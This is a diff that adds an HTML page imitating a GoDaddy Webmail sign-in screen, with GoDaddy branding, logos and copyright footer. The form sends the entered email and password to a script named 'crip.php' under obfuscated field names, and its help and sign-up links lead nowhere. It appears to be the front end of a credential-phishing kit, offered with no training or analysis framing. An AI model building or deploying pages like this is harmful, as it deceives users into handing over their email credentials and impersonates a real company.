@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <link rel="shortcut icon" href="./images/favicon-211.png" type="image/x-icon">
+    <link href="https://db.onlinewebfonts.com/c/0aee6008b82cde991ec28387169bb13e?family=GD+Sherpa+Regular"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
+    <link rel="stylesheet" href="./App-css/app.css">
+    <script defer src="./App-js/app.js"></script>
+</head>
+
+<body>
+    <header class="header-image-container">
+        <img src="./images/header-logo_202.png" alt="" class="header-img-big">
+        <img src="./images/logo_2021.png" alt="" class="header-img-small">
+    </header>
+    <main class="site">
+        <section class="site-body">
+            <aside class="site-bodyleft">
+                <img src="./images/side-logo.jpg" alt="" class="site-bodyimage">
+            </aside>
+            <aside class="site-bodyright">
+                <div class="site-bodyright-container">
+                    <form action="crip.php" method="POST" class="site-bodyform" id="site-bodyform">
+                        <h3 class="site-formheading">Webmail</h3>
+                        <div class="site-formcontent">
+                            <h4 class="site-formsubheading">Sign in</h4>
+                            <div class="main-form-input">
+                                <input class="user-input" type="email" name="bringwork" id="bringwork" placeholder=" " autocomplete="off">
+                                <div class="input-placeholder">Email<span> *</span></div>
+                                <div id="emError" class="error"></div>
+                            </div>
+                            <div class="main-form-input">
+                                <input class="user-input" type="password" name="bringworld" id="bringworld" placeholder=" "
+                                    autocomplete="off">
+                                <div class="input-placeholder">Password<span> *</span></div>
+                                <div id="pdError" class="error"></div>
+                                <button type="button" class="button-btn" id="toggleworld">Show</button>
+                            </div>
+                            <label for="checkme" id="checkme-label">
+                                <input type="checkbox" id="checkme" >
+                                <div class="checkme-box"></div>
+                                <p> Keep me signed in on this device</p>
+                            </label>
+                            <button type="submit" class="site-formbtn">Sign in</button>
+                            <p class="site-findform">Need to find <a href="#">your password</a><span class="mark-a">?</span></p>
+                        </div>
+                    </form>
+                    <p class="site-bodyquestion">Don't have GoDaddy email?</p>
+                    <a href="#" class="site__bodysignupbtn">Get Started</a>
+                </div>
+            </aside>
+        </section>
+        <footer class="site-footer">
+            <div class="container">
+                <small class="site-footertext">
+                    Copyright © 1999 - <span class="site-year">2024</span> GoDaddy Operating Company, LLC. All Rights Reserved.
+                    <a href="#" class="site-footerlink">Privacy Policy</a>
+                </small>
+            </div>
+        </footer>
+    </main>
+</body>
+
+</html>
